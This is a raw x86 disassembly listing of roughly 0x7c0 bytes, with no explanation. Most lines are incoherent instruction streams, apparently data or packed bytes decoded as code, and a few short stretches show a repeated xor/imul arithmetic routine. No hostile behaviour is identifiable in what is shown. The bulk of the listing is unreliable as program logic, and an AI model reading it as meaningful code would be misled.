  40b228:	sbb    DWORD PTR [eiz*1-0x6437e52e],eax
  40b22f:	ja     0x40b1c5
  40b231:	ret    0xa77f
  40b234:	dec    eax
  40b235:	stos   BYTE PTR es:[edi],al
  40b236:	cdq    
  40b237:	mov    dl,0xd2
  40b239:	pop    esi
  40b23a:	push   es
  40b23b:	mov    ebx,0x6d030c24
  40b240:	pop    ebp
  40b241:	popa   
  40b242:	test   BYTE PTR [ebp+0x438ee6c],dl
  40b248:	aas    
  40b249:	sahf   
  40b24a:	arpl   WORD PTR [edi],ax
  40b24c:	in     al,0x1c
  40b24e:	sub    edx,DWORD PTR [eax]
  40b250:	das    
  40b251:	clc    
  40b252:	sbb    BYTE PTR [ebp-0x2b],bl
  40b255:	sbb    esp,DWORD PTR [esi-0x6a801fa7]
  40b25b:	mov    dh,BYTE PTR [esi-0x2fff70e7]
  40b261:	test   DWORD PTR [esi],edi
  40b263:	sbb    ebx,DWORD PTR [ebx+0x58]
  40b266:	push   ebx
  40b267:	pinsrw mm2,edi,0x78
  40b26b:	pop    ebp
  40b26c:	dec    edi
  40b26d:	out    dx,eax
  40b26e:	in     eax,dx
  40b26f:	fstp   DWORD PTR [edi]
  40b271:	aas    
  40b272:	shr    DWORD PTR [esi+0x227e19c7],0x99
  40b279:	pop    ss
  40b27a:	push   ds
  40b27b:	or     al,0xd7
  40b27d:	mov    ebx,0xf47527ce
  40b282:	dec    edi
  40b283:	and    eax,0xea8408c4
  40b288:	aad    0x10
  40b28a:	jne    0x40b2dd
  40b28c:	mov    esi,0xfeebb277
  40b291:	and    BYTE PTR [esi],dl
  40b293:	inc    ebx
  40b294:	clc    
  40b295:	or     eax,0xe8d3cbb4
  40b29a:	daa    
  40b29b:	mov    al,ds:0xf02903a8
  40b2a0:	sub    BYTE PTR [ebx+0x42b14de2],ah
  40b2a6:	and    BYTE PTR [ebx-0x45],bl
  40b2a9:	sub    edi,DWORD PTR [eax+0x4fc0be7e]
  40b2af:	or     bh,BYTE PTR [esi]
  40b2b1:	loope  0x40b2b3
  40b2b3:	loope  0x40b2a5
  40b2b5:	test   eax,0xa1f01aac
  40b2ba:	xchg   BYTE PTR [ebx+ecx*4+0x6d],ch
  40b2be:	sub    eax,0x6948fc33
  40b2c3:	xor    DWORD PTR [esi],esp
  40b2c5:	dec    esp
  40b2c6:	mov    BYTE PTR [edi],bl
  40b2c8:	ins    BYTE PTR es:[edi],dx
  40b2c9:	add    ecx,eax
  40b2cb:	mov    BYTE PTR [esi+eiz*4],cl
  40b2ce:	or     DWORD PTR [ecx+0x4c],ebp
  40b2d1:	or     BYTE PTR [edi+0x43810cff],al
  40b2d7:	(bad)  
  40b2d8:	lods   al,BYTE PTR ds:[esi]
  40b2d9:	ja     0x40b308
  40b2db:	xchg   DWORD PTR [ebx-0x749cbb27],esi
  40b2e1:	mov    esi,0xc8abfe6d
  40b2e6:	(bad)  ds:[edi+0x3fde190b]
  40b2ed:	ret    0xeef2
  40b2f0:	hlt    
  40b2f1:	daa    
  40b2f2:	into   
  40b2f3:	enter  0xa31f,0xf2
  40b2f7:	pop    es
  40b2f8:	and    DWORD PTR [ebx+0x723ff4e6],edx
  40b2fe:	mov    eax,0xd9ef6506
  40b303:	xor    BYTE PTR [ebp-0xba780c2],0x2e
  40b30a:	rcr    DWORD PTR [edi-0x17],1
  40b30d:	fstp   TBYTE PTR [eax-0x75]
  40b310:	rcr    BYTE PTR [ebx],cl
  40b312:	pop    es
  40b313:	mov    esp,0x1ee74e4a
  40b318:	jae    0x40b33b
  40b31a:	out    dx,al
  40b31b:	pop    ss
  40b31c:	jne    0x40b38c
  40b31e:	int    0xd3
  40b320:	dec    ecx
  40b321:	ds inc ebp
  40b323:	pop    ebx
  40b324:	shl    BYTE PTR ds:0xacfd91d1,1
  40b32a:	enter  0x2a43,0x13
  40b32e:	ja     0x40b33f
  40b330:	pop    esi
  40b331:	push   ebx
  40b332:	gs push edi
  40b334:	mov    ds:0x947e71a1,eax
  40b339:	test   eax,0x990cba88
  40b33e:	mov    ch,0xcf
  40b340:	mov    edi,0x6858f5fc
  40b345:	push   esi
  40b346:	(bad)  
  40b347:	sub    edi,DWORD PTR [edx-0x3c]
  40b34a:	ficomp DWORD PTR [ebx+ebx*1]
  40b34d:	dec    edi
  40b34e:	push   DWORD PTR [eax-0x2d4d9b8b]
  40b354:	(bad)  
  40b355:	xchg   edi,eax
  40b356:	push   eax
  40b357:	sbb    ah,BYTE PTR [eax-0x85fff9d]
  40b35d:	sahf   
  40b35e:	cmp    BYTE PTR [edi+0x20],0xa
  40b362:	or     DWORD PTR [ecx],ebx
  40b364:	arpl   WORD PTR [ecx+0x53e4d6be],bx
  40b36a:	repnz mov bh,0x8
  40b36d:	inc    ebx
  40b36e:	pop    eax
  40b36f:	push   0xffffffdd
  40b371:	(bad)  
  40b372:	jmp    0x40b3aa
  40b374:	jb     0x40b35a
  40b376:	sub    esi,esp
  40b378:	mov    ah,0x1c
  40b37a:	cs push edx
  40b37c:	add    dl,BYTE PTR [eax+0x7a9137f2]
  40b382:	and    BYTE PTR [edi-0x26aa605c],ah
  40b388:	stos   DWORD PTR es:[edi],eax
  40b389:	jge    0x40b3e6
  40b38b:	arpl   WORD PTR [eax],si
  40b38d:	and    ah,BYTE PTR [ebx+0x7c]
  40b390:	jb     0x40b406
  40b392:	encls  
  40b395:	lock sbb al,0xf1
  40b398:	shr    DWORD PTR [ebx-0x36],1
  40b39b:	xchg   ebx,eax
  40b39c:	sbb    eax,0x633258c8
  40b3a1:	mov    esi,0xd90b0a9c
  40b3a6:	ins    BYTE PTR es:[edi],dx
  40b3a7:	xchg   edx,eax
  40b3a8:	loope  0x40b423
  40b3aa:	jae    0x40b3cb
  40b3ac:	push   ebx
  40b3ad:	push   es
  40b3ae:	ret    0x3477
  40b3b1:	pusha  
  40b3b2:	(bad)  
  40b3b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b3b4:	jg     0x40b3d5
  40b3b6:	jp     0x40b404
  40b3b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b3b9:	jl     0x40b38b
  40b3bb:	jp     0x40b3fe
  40b3bd:	loopne 0x40b3e3
  40b3bf:	push   ebp
  40b3c0:	push   eax
  40b3c1:	push   0x752a3adc
  40b3c6:	call   0xcda084a3
  40b3cb:	jno    0x40b3b6
  40b3cd:	jno    0x40b3d9
  40b3cf:	bound  eax,QWORD PTR [edx-0x7f]
  40b3d2:	dec    eax
  40b3d3:	cmc    
  40b3d4:	into   
  40b3d5:	xchg   esi,eax
  40b3d6:	cwde   
  40b3d7:	aaa    
  40b3d8:	inc    ebx
  40b3d9:	and    ebp,DWORD PTR [eax+ebx*4+0x6e]
  40b3dd:	shr    DWORD PTR [edx+0x7c],cl
  40b3e0:	aam    0x65
  40b3e2:	xor    eax,0xb50724eb
  40b3e7:	mov    al,0xff
  40b3e9:	inc    ecx
  40b3ea:	shl    BYTE PTR [ebx+0x73],cl
  40b3ed:	mov    bl,0x91
  40b3ef:	repnz sbb DWORD PTR [ecx],ebp
  40b3f2:	icebp  
  40b3f3:	test   BYTE PTR [eax+0x5384c6d5],0x36
  40b3fa:	loope  0x40b412
  40b3fc:	pop    es
  40b3fd:	jmp    0x7a8ce4ae
  40b402:	cwde   
  40b403:	and    DWORD PTR ds:0x4189749e,edi
  40b409:	call   0x23f2:0xf304dbc3
  40b410:	mov    ecx,0x31171799
  40b415:	adc    BYTE PTR [eax-0x5ef4098c],0x1
  40b41c:	nop
  40b41d:	dec    edi
  40b41e:	and    eax,0x38dd3d0d
  40b423:	add    al,0xe5
  40b425:	loop   0x40b408
  40b427:	cmp    ecx,esi
  40b429:	sub    eax,0x11410e81
  40b42e:	imul   esp,DWORD PTR [esi-0x33],0xfd05db97
  40b435:	mov    cl,0x33
  40b437:	je     0x40b3dc
  40b439:	aam    0xc3
  40b43b:	icebp  
  40b43c:	in     al,0x6f
  40b43e:	popf   
  40b43f:	push   cs
  40b440:	mov    bh,0x31
  40b442:	in     eax,dx
  40b443:	lods   al,BYTE PTR ds:[esi]
  40b444:	lea    esp,[ecx]
  40b446:	or     BYTE PTR [esi+edi*1+0x3a650dc9],0x1e
  40b44e:	and    al,0xaf
  40b450:	pop    edi
  40b451:	fxch   st(6)
  40b453:	rol    DWORD PTR [esi-0x70],1
  40b456:	es pop ecx
  40b458:	jne    0x40b463
  40b45a:	xor    edi,eax
  40b45c:	jb     0x40b4b4
  40b45e:	aad    0xeb
  40b460:	jmp    0xdafb:0x170d3248
  40b467:	test   DWORD PTR [ebp+edi*8+0x2e],esp
  40b46b:	nop
  40b46c:	mov    ebx,DWORD PTR [ebx+0x32]
  40b46f:	sbb    DWORD PTR [ebp+0x23],eax
  40b472:	outs   dx,DWORD PTR ds:[esi]
  40b473:	sub    BYTE PTR [ecx+ecx*4],dh
  40b476:	ret    0x6564
  40b479:	mov    ecx,0x35cfeb4a
  40b47e:	sub    eax,0xb6e68df8
  40b483:	dec    edi
  40b484:	rol    BYTE PTR [ebp-0x38bb9f24],0xc3
  40b48b:	call   0x7b6d:0x21b623fb
  40b492:	mov    esi,0x9a3e4ff6
  40b497:	lods   eax,DWORD PTR ds:[esi]
  40b498:	or     eax,0xb6805514
  40b49d:	or     ebx,DWORD PTR [esi]
  40b49f:	getsec 
  40b4a1:	jns    0x40b4b1
  40b4a3:	mov    ss,ebx
  40b4a5:	push   esi
  40b4a6:	and    dl,dl
  40b4a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b4a9:	(bad)  
  40b4aa:	jne    0x40b487
  40b4ac:	leave  
  40b4ad:	xchg   ecx,eax
  40b4ae:	shl    DWORD PTR [edi-0x1c87e8b1],1
  40b4b4:	fdiv   DWORD PTR [esi-0x48]
  40b4b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b4b8:	add    eax,0x59b5cacd
  40b4bd:	mov    BYTE PTR [esp+ebx*8],dl
  40b4c0:	ins    BYTE PTR es:[edi],dx
  40b4c1:	xchg   ecx,eax
  40b4c2:	dec    edx
  40b4c3:	in     eax,dx
  40b4c4:	repz push edx
  40b4c6:	xchg   BYTE PTR [eax-0x1b6c8c4a],bl
  40b4cc:	xchg   esi,eax
  40b4cd:	xchg   eax,esi
  40b4cf:	lea    ebx,[eax+0x38]
  40b4d2:	jno    0x40b4da
  40b4d4:	retf   0x9147
  40b4d7:	adc    dl,dh
  40b4d9:	icebp  
  40b4da:	adc    al,0x95
  40b4dc:	addr16 ret 
  40b4de:	inc    edi
  40b4df:	xchg   ebx,eax
  40b4e0:	test   al,0xb8
  40b4e2:	(bad)
  40b4e5:	pop    ebx
  40b4e6:	or     ecx,DWORD PTR [esi-0x7dd3f626]
  40b4ec:	xchg   esp,eax
  40b4ed:	ds xor eax,0x57045f5c
  40b4f3:	or     bl,BYTE PTR [ebx+0x1bf2596b]
  40b4f9:	leave  
  40b4fa:	cld    
  40b4fb:	fisubr WORD PTR [ecx]
  40b4fd:	dec    eax
  40b4fe:	xor    BYTE PTR [eax-0x63],dh
  40b501:	fimul  DWORD PTR [ebx+0xb]
  40b504:	inc    esi
  40b505:	inc    ebp
  40b506:	xchg   BYTE PTR [edi],ch
  40b508:	push   esp
  40b509:	adc    bh,cl
  40b50b:	fmul   st(6),st
  40b50d:	in     al,0xea
  40b50f:	push   esp
  40b511:	add    BYTE PTR [eax+0x511f1c76],0xc1
  40b518:	inc    eax
  40b519:	addr16 xchg ebx,eax
  40b51b:	pop    esi
  40b51c:	xchg   edi,eax
  40b51d:	jnp    0x40b540
  40b51f:	xchg   edx,eax
  40b520:	imul   edx,edi
  40b523:	mov    edi,DWORD PTR [ebp-0x8]
  40b526:	mov    ebx,DWORD PTR [ebp-0x10]
  40b529:	sub    ebx,edi
  40b52b:	cmp    ebx,edx
  40b52d:	ja     0x40b53b
  40b533:	mov    edx,DWORD PTR [ebp-0x2c]
  40b536:	jmp    0x40c0ee
  40b53b:	mov    edx,DWORD PTR [ebp-0x34]
  40b53e:	jmp    0x40b8fc
  40b543:	cmp    eax,0x7178931c
  40b548:	mov    bh,0x49
  40b54a:	loope  0x40b546
  40b54c:	loop   0x40b5b2
  40b54e:	pop    edx
  40b54f:	cmp    dh,ch
  40b551:	lock xchg esp,eax
  40b553:	rol    DWORD PTR [esi+0x7d9f7070],0x70
  40b55a:	jo     0x40b56f
  40b55c:	add    DWORD PTR [ebx-0x9318065],ebx
  40b562:	adc    DWORD PTR [edi+0x5e],0x91b9014e
  40b569:	ds enter 0x656a,0xaf
  40b56e:	(bad)  
  40b56f:	and    dh,bl
  40b571:	mov    DWORD PTR [eax+edx*1-0x54d6a6f],edx
  40b578:	sbb    bh,BYTE PTR [edx-0x71]
  40b57b:	add    edi,DWORD PTR [esi-0x66]
  40b57e:	cs fs gs adc eax,0x572f2184
  40b586:	inc    ebp
  40b587:	aas    
  40b588:	cmp    eax,0x2224ed9e
  40b58d:	stos   BYTE PTR es:[edi],al
  40b58e:	lahf   
  40b58f:	xchg   edi,eax
  40b590:	out    dx,al
  40b591:	ficom  WORD PTR ds:0x95fdc523
  40b597:	dec    eax
  40b598:	test   DWORD PTR [eax-0x6d],0xc6062170
  40b59f:	loop   0x40b5f0
  40b5a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b5a2:	jg     0x40b56b
  40b5a4:	mov    esp,0x88716bef
  40b5a9:	ror    edi,1
  40b5ab:	int    0x16
  40b5ad:	repz bound esi,QWORD PTR [ecx-0x1c]
  40b5b1:	fidivr WORD PTR [ebx]
  40b5b3:	push   0xffffff9d
  40b5b5:	dec    ebx
  40b5b6:	dec    eax
  40b5b7:	cld    
  40b5b8:	jle    0x40b631
  40b5ba:	pop    ecx
  40b5bb:	cmp    bl,BYTE PTR [ebp-0x5c]
  40b5be:	pushf  
  40b5bf:	loop   0x40b626
  40b5c1:	aam    0xea
  40b5c3:	imul   ecx,DWORD PTR [edi],0x4d
  40b5c6:	jl     0x40b5de
  40b5c8:	sub    esi,esp
  40b5ca:	add    ecx,DWORD PTR [ebp+0x49a2f141]
  40b5d0:	add    DWORD PTR ds:0xba5ae061,esi
  40b5d6:	stc    
  40b5d7:	mov    BYTE PTR [ebx],dh
  40b5d9:	ds std 
  40b5db:	mov    ah,0x19
  40b5dd:	imul   ebp,esp,0xe1005781
  40b5e3:	repz jge 0x40b619
  40b5e6:	retf   0xecfc
  40b5e9:	fcomp  QWORD PTR [ebx+0x218b050d]
  40b5ef:	fmul   DWORD PTR [ecx]
  40b5f1:	pop    eax
  40b5f3:	out    0xe,eax
  40b5f5:	jmp    0x76da0181
  40b5fa:	(bad)  
  40b5fb:	shr    DWORD PTR [ecx-0x72],0x68
  40b5ff:	or     eax,0xc7c9c5dc
  40b604:	mov    ds,WORD PTR [esi]
  40b606:	js     0x40b622
  40b608:	iret   
  40b609:	mov    ecx,0x91c16307
  40b60e:	dec    ebx
  40b60f:	sar    BYTE PTR [esi],cl
  40b611:	out    0xdd,al
  40b613:	or     eax,DWORD PTR [ecx+0x21]
  40b616:	cdq    
  40b617:	adc    dh,BYTE PTR ds:0xf0ce04c2
  40b61d:	xchg   ecx,eax
  40b61e:	(bad)  
  40b620:	sbb    al,0x62
  40b622:	or     eax,0x13d02ffa
  40b627:	sahf   
  40b628:	lds    edi,FWORD PTR [ebp-0x4d1a6898]
  40b62e:	outs   dx,BYTE PTR ds:[esi]
  40b62f:	and    eax,0x4b613b73
  40b634:	fwait
  40b635:	or     al,0x87
  40b637:	shl    BYTE PTR [ecx],cl
  40b639:	fdiv   QWORD PTR [eax+0x180d46a3]
  40b63f:	push   ebp
  40b640:	sbb    dl,dl
  40b642:	imul   ebx,DWORD PTR [eax-0x2d58b571],0xf4d5b50f
  40b64c:	inc    ebp
  40b64d:	in     ax,0x1e
  40b650:	cs aaa 
  40b652:	sub    eax,0x27751373
  40b657:	fidiv  DWORD PTR [edi]
  40b659:	stos   BYTE PTR es:[edi],al
  40b65a:	fwait
  40b65b:	div    cl
  40b65d:	into   
  40b65e:	ret    
  40b65f:	dec    eax
  40b660:	xchg   esp,eax
  40b661:	out    0x78,eax
  40b663:	add    edx,DWORD PTR [edx-0x4a]
  40b666:	loop   0x40b601
  40b668:	sub    DWORD PTR [ecx],edi
  40b66a:	or     BYTE PTR [eax],al
  40b66c:	test   edx,eax
  40b66e:	mov    dh,0x8e
  40b670:	push   esp
  40b671:	enter  0xc954,0xe4
  40b675:	cli    
  40b676:	pop    esp
  40b677:	(bad)  
  40b679:	xchg   ebx,eax
  40b67a:	(bad)  
  40b67c:	push   esp
  40b67d:	ret    
  40b67e:	mov    ?,WORD PTR [eax+0x60]
  40b681:	xchg   edx,eax
  40b682:	aad    0x2d
  40b684:	inc    edx
  40b685:	xor    BYTE PTR [eax+eiz*8-0x961d2f0],0x28
  40b68d:	sbb    DWORD PTR [esi],ebx
  40b68f:	pop    ebx
  40b690:	push   0xe48b029c
  40b695:	outs   dx,BYTE PTR ds:[esi]
  40b696:	gs pop ecx
  40b698:	(bad)  
  40b699:	jae    0x40b6dd
  40b69b:	xchg   ebx,eax
  40b69c:	(bad)  
  40b69d:	sub    al,0x5e
  40b69f:	pop    ebp
  40b6a0:	shr    DWORD PTR [edx],1
  40b6a2:	ficom  WORD PTR [ebp+0x1dd220d]
  40b6a8:	fwait
  40b6a9:	sub    esp,DWORD PTR [ecx+0x45]
  40b6ac:	ins    BYTE PTR es:[edi],dx
  40b6ad:	mov    esp,DWORD PTR [eax+ecx*1+0x19]
  40b6b1:	xor    dl,ch
  40b6b3:	in     al,0x58
  40b6b5:	pushf  
  40b6b6:	rcr    DWORD PTR [ebp+0xc542baf],1
  40b6bc:	retf   0x5540
  40b6bf:	out    dx,al
  40b6c0:	ror    ebx,0x91
  40b6c3:	jl     0x40b680
  40b6c5:	xchg   ebp,eax
  40b6c6:	or     ebp,esi
  40b6c8:	mov    bh,BYTE PTR [ecx-0x6e]
  40b6cb:	loopne 0x40b6cb
  40b6cd:	ins    BYTE PTR es:[edi],dx
  40b6ce:	and    eax,0x6b0bbd43
  40b6d3:	ins    DWORD PTR es:[edi],dx
  40b6d4:	cmp    esi,edx
  40b6d6:	cmovp  ebx,DWORD PTR [si-0x60]
  40b6db:	js     0x40b6e7
  40b6dd:	and    eax,0xb797718f
  40b6e2:	repz dec edx
  40b6e4:	popf   
  40b6e5:	in     eax,0x64
  40b6e7:	pop    ecx
  40b6e8:	(bad)  
  40b6e9:	jo     0x40b6f3
  40b6eb:	xchg   BYTE PTR [edi],ah
  40b6ed:	icebp  
  40b6ee:	out    0x49,eax
  40b6f0:	sbb    esp,DWORD PTR gs:[ebx+0x79a2294a]
  40b6f7:	jbe    0x40b6fa
  40b6f9:	add    eax,0xe190c781
  40b6fe:	jge    0x40b691
  40b700:	mov    esp,0x3814d953
  40b705:	push   eax
  40b706:	outs   dx,DWORD PTR ds:[esi]
  40b707:	fxam   
  40b709:	pop    esi
  40b70a:	push   ecx
  40b70b:	outs   dx,DWORD PTR ds:[esi]
  40b70c:	sub    dl,BYTE PTR [edx+0x4bba8fcd]
  40b712:	xor    eax,DWORD PTR [edx+ebx*4-0x4a]
  40b716:	retf   
  40b717:	mov    al,ds:0x5e3750a9
  40b71c:	stos   DWORD PTR es:[edi],eax
  40b71d:	popf   
  40b71e:	jbe    0x40b728
  40b720:	sub    ebp,eax
  40b722:	xor    DWORD PTR [eax],ebp
  40b724:	xor    edx,ebx
  40b726:	pop    edi
  40b727:	popf   
  40b728:	int3   
  40b729:	imul   edx,edx,0x5fa5d74e
  40b72f:	xlat   BYTE PTR ds:[ebx]
  40b730:	and    al,0xe4
  40b732:	fwait
  40b733:	in     al,dx
  40b734:	and    cl,0xa9
  40b737:	scas   eax,DWORD PTR es:[edi]
  40b738:	sub    BYTE PTR fs:[edi],ch
  40b73b:	dec    ecx
  40b73c:	int3   
  40b73d:	es or  eax,0x7754cb6a
  40b743:	pop    eax
  40b744:	sahf   
  40b745:	cmp    ch,BYTE PTR ds:0x9e7d4540
  40b74b:	pop    ds
  40b74c:	or     BYTE PTR [esi-0x59],dl
  40b74f:	and    al,0xae
  40b751:	jge    0x40b6f4
  40b753:	sub    cl,bh
  40b755:	inc    esi
  40b756:	retf   0x149e
  40b759:	addr16 jb 0x40b77e
  40b75c:	out    0x12,al
  40b75e:	xlat   BYTE PTR ds:[ebx]
  40b75f:	in     eax,dx
  40b760:	call   0x7a509dd0
  40b765:	js     0x40b725
  40b767:	sub    ah,BYTE PTR [edx]
  40b769:	mov    edi,0x6184632d
  40b76e:	adc    edx,0xf23ca6f6
  40b774:	xor    cl,BYTE PTR [ebp+0x7ff9ace3]
  40b77a:	dec    edx
  40b77b:	jl     0x40b7f1
  40b77d:	mov    ecx,0x281d2148
  40b782:	xlat   BYTE PTR ds:[ebx]
  40b783:	adc    DWORD PTR ds:0xc6120dd8,0x789cc824
  40b78d:	mov    esp,0x322219c6
  40b792:	sub    eax,0x9dff075d
  40b797:	mov    esi,0xd455dbf7
  40b79c:	push   esp
  40b79d:	mov    ecx,DWORD PTR [ebx-0x3c]
  40b7a0:	sbb    al,BYTE PTR [edi]
  40b7a2:	cmp    ebp,DWORD PTR [esi-0x1c]
  40b7a5:	cld    
  40b7a6:	in     al,dx
  40b7a7:	in     eax,0x7d
  40b7a9:	imul   ebp,DWORD PTR [ecx-0x533e64a0],0x5f06b608
  40b7b3:	mov    ebp,0x55dcc114
  40b7b8:	or     bh,BYTE PTR [ebp-0x1b0fb4fd]
  40b7be:	fs push eax
  40b7c0:	mov    bl,0xe7
  40b7c2:	push   edi
  40b7c3:	add    BYTE PTR [ebx+edx*2-0x29],dl
  40b7c7:	sti    
  40b7c8:	hlt    
  40b7c9:	into   
  40b7ca:	mov    bl,0x89
  40b7cc:	or     eax,0x46a2fb9e
  40b7d1:	pop    edx
  40b7d2:	cmp    eax,0x86739aaf
  40b7d7:	shr    ch,1
  40b7d9:	lock inc ebp
  40b7db:	sub    al,0x29
  40b7dd:	add    dl,BYTE PTR [ebp-0x5c]
  40b7e0:	xor    dl,BYTE PTR [ebx+edx*4+0x79e4194a]
  40b7e7:	rcr    ebp,cl
  40b7e9:	retf   
  40b7ea:	adc    al,0x6d
  40b7ec:	inc    ecx
  40b7ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b7ee:	jbe    0x40b7eb
  40b7f0:	mov    ds:0x883ab314,eax
  40b7f5:	dec    ecx
  40b7f6:	xchg   edx,eax
  40b7f7:	mov    cl,0x23
  40b7f9:	(bad)  
  40b7fa:	mov    al,0x8e
  40b7fc:	and    dh,BYTE PTR [eax-0x5177794]
  40b802:	fld    st(4)
  40b804:	sbb    eax,0x59e17eea
  40b809:	sbb    BYTE PTR [edx],dh
  40b80b:	cwde   
  40b80c:	sysexit 
  40b80e:	arpl   WORD PTR [edi],ax
  40b810:	cwde   
  40b811:	sub    BYTE PTR [ecx+ecx*1+0x4aa26844],cl
  40b818:	xchg   esp,eax
  40b819:	(bad)  
  40b81a:	ins    DWORD PTR es:[edi],dx
  40b81b:	mov    edi,0x4347e10f
  40b820:	jmp    0x40b86b
  40b822:	in     al,0x2b
  40b824:	aaa    
  40b825:	inc    eax
  40b826:	sub    BYTE PTR ds:0xcf5fe30a,bl
  40b82c:	xchg   esi,eax
  40b82d:	into   
  40b82e:	mov    ss,WORD PTR [edi-0x49]
  40b831:	loope  0x40b805
  40b833:	pop    edi
  40b834:	nop
  40b835:	(bad)  
  40b836:	adc    ebp,DWORD PTR [esi]
  40b838:	or     ah,cl
  40b83a:	or     ah,bl
  40b83c:	jo     0x40b84b
  40b83e:	(bad)  
  40b83f:	xor    eax,0xd7df81e7
  40b844:	ret    0x1b93
  40b847:	fimul  DWORD PTR [esi+0x3]
  40b84a:	bswap  ebp
  40b84c:	cmp    ebx,esi
  40b84e:	(bad)  
  40b84f:	cmp    BYTE PTR [edi+edx*2+0x4978a85e],ch
  40b856:	inc    eax
  40b857:	fld    QWORD PTR [ebx-0x524a7122]
  40b85d:	daa    
  40b85e:	test   al,0x15
  40b860:	inc    ecx
  40b861:	in     eax,dx
  40b862:	xor    esi,edi
  40b864:	dec    edi
  40b865:	jmp    0xa325:0xf77c2e13
  40b86c:	popf   
  40b86d:	jmp    0xd92612a8
  40b872:	push   es
  40b873:	mov    edi,0x61b82ca6
  40b878:	cmp    DWORD PTR [edi+0x16],edx
  40b87b:	test   DWORD PTR [ecx-0x71],0x9035161
  40b882:	addr16 loopne 0x40b8f9
  40b885:	mov    eax,ds:0x4a6538bf
  40b88a:	jo     0x40b858
  40b88c:	jecxz  0x40b848
  40b88e:	mov    gs,WORD PTR [edx]
  40b890:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b891:	mov    ds:0x1324c007,al
  40b896:	xor    eax,0xd5ed8623
  40b89b:	jbe    0x40b822
  40b89d:	pushf  
  40b89e:	push   ds
  40b89f:	pop    esp
  40b8a0:	jne    0x40b90a
  40b8a2:	adc    BYTE PTR [ecx-0x76],al
  40b8a5:	fsubr  QWORD PTR [ebx-0x4e]
  40b8a8:	inc    edx
  40b8a9:	push   ecx
  40b8aa:	test   bl,0x58
  40b8ad:	inc    esi
  40b8ae:	jle    0x40b84f
  40b8b0:	loop   0x40b85b
  40b8b2:	mov    ebp,0xa184dead
  40b8b7:	(bad)  
  40b8b8:	xchg   ecx,eax
  40b8b9:	jle    0x40b923
  40b8bb:	or     bl,BYTE PTR [ebx]
  40b8bd:	in     al,0xf8
  40b8bf:	and    al,0x7e
  40b8c1:	enter  0x2e3b,0x63
  40b8c5:	jne    0x40b8c5
  40b8c7:	out    dx,al
  40b8c8:	add    DWORD PTR [ecx],0x49d93513
  40b8ce:	retf   0x21f2
  40b8d1:	fnsave [edx]
  40b8d3:	push   0xc83ea677
  40b8d8:	pop    esp
  40b8d9:	test   bl,0xf6
  40b8dc:	ror    DWORD PTR [eax+ebx*8+0x24a63200],cl
  40b8e3:	cmp    eax,0xbf8d0db
  40b8e8:	jbe    0x40b8cf
  40b8ea:	mov    edx,0x94fce324
  40b8ef:	jne    0x40b8b7
  40b8f1:	int3   
  40b8f2:	(bad)  
  40b8f3:	xchg   DWORD PTR [ecx],eax
  40b8f5:	pop    eax
  40b8f6:	jmp    0x5869faca
  40b8fb:	adc    cl,BYTE PTR [ebx-0x2fcc0383]
  40b901:	xor    edi,eax
  40b903:	add    edi,ecx
  40b905:	add    edx,ecx
  40b907:	imul   edx,edi
  40b90a:	mov    edi,DWORD PTR [ebp-0x8]
  40b90d:	mov    ebx,DWORD PTR [ebp-0x10]
  40b910:	sub    ebx,edi
  40b912:	cmp    ebx,edx
  40b914:	ja     0x40b922
  40b91a:	mov    edx,DWORD PTR [ebp-0x30]
  40b91d:	jmp    0x40c0ee
  40b922:	mov    edx,DWORD PTR [ebp-0x38]
  40b925:	mov    edi,DWORD PTR [ebp-0x4]
  40b928:	xor    edx,eax
  40b92a:	xor    edi,eax
  40b92c:	add    edi,ecx
  40b92e:	add    edx,ecx
  40b930:	imul   edx,edi
  40b933:	mov    edi,DWORD PTR [ebp-0x8]
  40b936:	jmp    0x40bcf4
  40b93b:	xchg   ebp,eax
  40b93c:	fcomi  st,st(6)
  40b93e:	push   esi
  40b93f:	jb     0x40b992
  40b941:	mov    ch,0xdb
  40b943:	shl    BYTE PTR [ebx-0x64ce9905],cl
  40b949:	or     bl,bl
  40b94b:	pusha  
  40b94c:	xor    DWORD PTR [eax+0x70],0xffffff9f
  40b950:	jge    0x40b9c2
  40b952:	jo     0x40b93b
  40b954:	push   edx
  40b955:	cwde   
  40b956:	mov    ds:0x17a4f8ad,eax
  40b95b:	and    eax,0xea6af1db
  40b960:	xchg   ecx,eax
  40b961:	in     eax,0xf3
  40b963:	sub    eax,0x6703268e
  40b968:	mov    dh,0xaa
  40b96a:	loopne 0x40b945
  40b96c:	out    dx,eax
  40b96d:	mov    ebp,0xe5b8f774
  40b972:	mov    dh,0xda
  40b974:	pop    esp
  40b975:	push   edi
  40b976:	add    eax,0xfa486205
  40b97b:	pushf  
  40b97c:	icebp  
  40b97d:	pop    edi
  40b97e:	jns    0x40b9fb
  40b980:	mov    ebx,0x59492ec1
  40b985:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b986:	hlt    
  40b987:	(bad)  [esi-0x516d8755]
  40b98d:	or     DWORD PTR [ecx-0x56],0xe37646f6
  40b994:	int3   
  40b995:	and    esp,DWORD PTR [edi]
  40b997:	or     al,0x77
  40b999:	xchg   ebx,eax
  40b99a:	retf   
  40b99b:	fst    QWORD PTR [ecx*2+0x3fdd0426]
  40b9a2:	arpl   WORD PTR [edx-0x6b59606b],cx
  40b9a8:	imul   ebp,DWORD PTR [ecx+0x55],0xa7270c26
  40b9af:	ins    BYTE PTR es:[edi],dx
  40b9b0:	ret    0xdba4
  40b9b3:	add    al,bl
  40b9b5:	pop    ebp
  40b9b6:	xchg   ecx,eax
  40b9b7:	or     DWORD PTR [eax-0x59],0x14
  40b9bb:	lahf   
  40b9bc:	dec    ecx
  40b9bd:	adc    eax,DWORD PTR [edx+0x4b]
  40b9c0:	mov    WORD PTR [ebp+0x79],ds
  40b9c3:	xchg   ebx,eax
  40b9c4:	or     BYTE PTR [edi-0x3c766e5],ch
  40b9ca:	call   esi
  40b9cc:	sub    cl,BYTE PTR [ebp+0x703c6078]
  40b9d2:	shl    DWORD PTR [edi-0x6cf5998],cl
  40b9d8:	fdivr  QWORD PTR [ebp+0x2cc944ba]
  40b9de:	xchg   BYTE PTR [edx],bl
  40b9e0:	retf   0x8b4d
  40b9e3:	jle    0x40ba1c
  40b9e5:	sbb    DWORD PTR [edi],edx
